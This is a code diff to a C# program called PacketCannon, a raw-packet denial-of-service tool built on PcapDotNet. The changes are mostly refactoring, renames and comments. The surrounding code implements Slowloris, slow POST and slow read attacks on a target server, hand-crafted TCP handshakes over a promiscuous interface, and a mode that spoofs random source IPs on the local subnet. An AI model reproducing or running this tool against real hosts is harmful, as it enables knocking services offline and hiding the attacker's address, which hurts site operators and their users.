@@ -5,8 +5,6 @@ using PcapDotNet.Packets.Transport;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
-using System.Globalization;
-using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
@@ -47,8 +45,9 @@ namespace PacketCannon
         public int DdosCount = 5;
         public int FakeIpAddressMin = 1;
         public int FakeIpAddressMax = 254;
-        private Random rand = new Random();
+        private readonly Random _rand = new Random();
 
+        //Get mac address from IP address
         public string GetLocalMacAddress(string ipAddress)
         {
             return Regex.Replace(
@@ -73,13 +72,16 @@ namespace PacketCannon
                 case "2":
                     _attackMode = Attacks.SlowRead;
                     break;
+
+                default:
+                    _attackMode = Attacks.SlowLoris;
+                    break;
             }
         }
 
         public void StartSenders()
         {
             DestinationMac = GetMacFromIp(DestinationIpV4);
-
             SourceMac = new MacAddress(Regex.Replace(
                 NetworkInterface.GetAllNetworkInterfaces()
                     .FirstOrDefault(netInt => SelectedDevice.Name.Contains(netInt.Id))
@@ -97,14 +99,9 @@ namespace PacketCannon
             DosSenders = new ConcurrentBag<DosSender>();
 
             for (int i = 0; i < SenderSize; i++)
-            {
-                DosSenders.Add(new DosSender(SourceIpv4, DestinationIpV4, DestinationMac, SourceMac, HostAddress, SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader, SlowReadUrl, SourcePort, PortStep, Ddos));
-            }
-
-            foreach (var dosSender in DosSenders)
-            {
-                Console.WriteLine(dosSender.SourceIpV4.ToString());
-            }
+                DosSenders.Add(new DosSender(SourceIpv4, DestinationIpV4, DestinationMac, SourceMac, HostAddress,
+                    SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader, SlowReadUrl,
+                    SourcePort, PortStep, Ddos));
 
             if (_attackMode == Attacks.SlowRead)
             {
@@ -113,10 +110,15 @@ namespace PacketCannon
                     dosSender.WindowSize = (ushort)SlowReadWindowSize;
                 }
             }
+
+            //<For logging>
+
             //Random rand = new Random();
             //var path = $@"C:\Users\Mystify_PC\source\repos\WpfApp2\test{rand.Next()}.txt";
             //var a = File.Create(path);
             //a.Close();
+
+            //</>
             var watcher = new Thread(SearchForPackets);
             watcher.Start();
             using (Communicator = SelectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 100))
@@ -178,7 +180,7 @@ namespace PacketCannon
 
                             //SLOWLORIS
                             case SenderStat.SendingSlowLorisGetHeader:
-                                dosSender.SendGetNotComplete(Communicator);
+                                dosSender.SendSlowlorisNotCompleteGet(Communicator);
                                 dosSender.Status = SenderStat.SendingKeepAliveForSlowLoris;
 
                                 //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowlorisGetHeader";
@@ -225,9 +227,9 @@ namespace PacketCannon
                             default:
                                 throw new ArgumentOutOfRangeException();
                         }
-                        Thread.Sleep(SenderTimeOut == 0 ? new Random().Next(5, 20) : SenderTimeOut);
+                        Thread.Sleep(SenderTimeOut);
                     }
-                    Thread.Sleep(SenderWaveTimeOut == 0 ? new Random().Next(1000, 5000) : SenderWaveTimeOut);
+                    Thread.Sleep(SenderWaveTimeOut);
                     //using (StreamWriter sw = File.AppendText(path))
                     //{
                     //    sw.Write(logs);
@@ -238,6 +240,7 @@ namespace PacketCannon
 
         private void SearchForPackets()
         {
+            //Endless analyze of incomming packets
             using (PacketCommunicator com = SelectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 100))
             {
                 com.SetFilter("tcp and src " + DestinationIpV4 + " and src port " + DosSender.DestinationPort);
@@ -245,10 +248,10 @@ namespace PacketCannon
                 {
                     if (com.ReceivePacket(out var packet) == PacketCommunicatorReceiveResult.Ok)
                     {
-                        DosSender a;
+                        DosSender dosSender;
                         try
                         {
-                            a = Ddos ? DosSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort && FakeIpV4Addresses.Contains(packet.Ethernet.IpV4.Destination))
+                            dosSender = Ddos ? DosSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort && FakeIpV4Addresses.Contains(packet.Ethernet.IpV4.Destination))
                              : DosSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort);
                         }
                         catch (Exception)
@@ -256,24 +259,24 @@ namespace PacketCannon
                             continue;
                         }
 
-                        if (a.Status == SenderStat.WaitingForAck)
+                        if (dosSender.Status == SenderStat.WaitingForAck)
                         {
-                            a.Status = SenderStat.SendingAck;
-                            a.SeqNumber = a.ExpectedAckNumber;
-                            a.AckNumber = packet.Ethernet.IpV4.Tcp.SequenceNumber + 1;
-                            a.Waited = 0;
+                            dosSender.Status = SenderStat.SendingAck;
+                            dosSender.SeqNumber = dosSender.ExpectedAckNumber;
+                            dosSender.AckNumber = packet.Ethernet.IpV4.Tcp.SequenceNumber + 1;
+                            dosSender.Waited = 0;
                         }
                         else if (packet.Ethernet.IpV4.Tcp.ControlBits == (TcpControlBits)20 || packet.Ethernet.IpV4.Tcp.ControlBits == (TcpControlBits)4)
                         {
-                            a.Status = SenderStat.SendSyn;
-                            a.SeqNumber = (uint)new Random().Next();
+                            dosSender.Status = SenderStat.SendSyn;
+                            dosSender.SeqNumber = (uint)new Random().Next();
                         }
-                        else if (a.Status == SenderStat.RecievingSlowRead && _attackMode == Attacks.SlowRead &&
+                        else if (dosSender.Status == SenderStat.RecievingSlowRead && _attackMode == Attacks.SlowRead &&
                                  (packet.Ethernet.IpV4.Tcp.ControlBits == TcpControlBits.Acknowledgment || packet.Ethernet.IpV4.Tcp.ControlBits == (TcpControlBits)24))
                         {
-                            a.Status = SenderStat.SendKeepAliveAckForSlowRead;
-                            a.AckNumber = packet.Ethernet.IpV4.Tcp.SequenceNumber + (uint)packet.Ethernet.IpV4.Tcp.PayloadLength;
-                            a.Waited = 0;
+                            dosSender.Status = SenderStat.SendKeepAliveAckForSlowRead;
+                            dosSender.AckNumber = packet.Ethernet.IpV4.Tcp.SequenceNumber + (uint)packet.Ethernet.IpV4.Tcp.PayloadLength;
+                            dosSender.Waited = 0;
                         }
                     }
                 }
@@ -311,7 +314,7 @@ namespace PacketCannon
 
             while (FakeIpV4Addresses.Count != count)
             {
-                var ipAddressFaked = new IpV4Address($"{ipAddress[0]}.{ipAddress[1]}.{ipAddress[2]}.{rand.Next(FakeIpAddressMin, FakeIpAddressMax)}");
+                var ipAddressFaked = new IpV4Address($"{ipAddress[0]}.{ipAddress[1]}.{ipAddress[2]}.{_rand.Next(FakeIpAddressMin, FakeIpAddressMax)}");
                 if (!FakeIpV4Addresses.Contains(ipAddressFaked) && !ipAddressFaked.ToString().Equals(SourceIpv4) && !ipAddressFaked.ToString().Equals(DestinationIpV4))
                 {
                     FakeIpV4Addresses.Add(ipAddressFaked);
@@ -337,13 +340,13 @@ namespace PacketCannon
 
         public static bool PingAddress(string address)
         {
-            bool pingable = false;
+            var pingable = false;
             Ping pinger = null;
 
             try
             {
                 pinger = new Ping();
-                PingReply reply = pinger.Send(address);
+                var reply = pinger.Send(address);
                 pingable = reply.Status == IPStatus.Success;
             }
             catch (PingException)
